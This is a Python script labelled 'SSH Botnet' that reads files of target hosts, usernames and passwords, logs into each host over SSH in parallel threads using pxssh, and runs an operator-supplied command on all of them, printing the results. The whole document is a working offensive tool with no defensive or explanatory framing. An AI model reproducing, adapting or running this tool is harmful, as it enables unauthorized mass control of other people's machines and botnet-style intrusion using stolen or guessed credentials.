import argparse
from pexpect import pxssh
import threading


screenlock = threading.Semaphore(value=15)
def connect(host,user,password,command):
	try:
		screenlock.acquire()
		s = pxssh.pxssh()
		s.login(host,user,password)
		s.sendline(command)
		s.prompt()
		print(s.before)
	except Exception as e:
		print('[-] Error Connecting')
	finally:
		screenlock.release()

def main():
	parser = argparse.ArgumentParser(description='SSH Botnet')
	required = parser.add_argument_group('Required Arguments')
	required.add_argument('-H',dest='hostFile',help='Specify target hosts file')
	required.add_argument('-U',dest='userFile',help='Specify target users file')
	required.add_argument('-F',dest='passwordFile',help='Specify password file')
	required.add_argument('-C',dest='command',help='Specify command to send.')
	options = parser.parse_args()
	hostFile = options.hostFile
	userFile = options.userFile
	passwordFile = options.passwordFile
	command = options.command
	if hostFile == None or userFile == None or passwordFile ==None or command == None:
		parser.print_help()
		exit(0)
	with open(hostFile) as f1, open(userFile) as f2, open(passwordFile) as f3:
		for f1line,f2line,f3line in zip(f1.readlines(),f2.readlines(),f3.readlines()):
			host = f1line.strip('\r').strip('\n')
			user = f2line.strip('\r').strip('\n')
			password = f3line.strip('\r').strip('\n')
			print('[*] Trying .... '+user+':'+password+'@'+host)
			t = threading.Thread(target=connect,args=(host,user,password,command))
			t.start()

if __name__ == '__main__':
	main()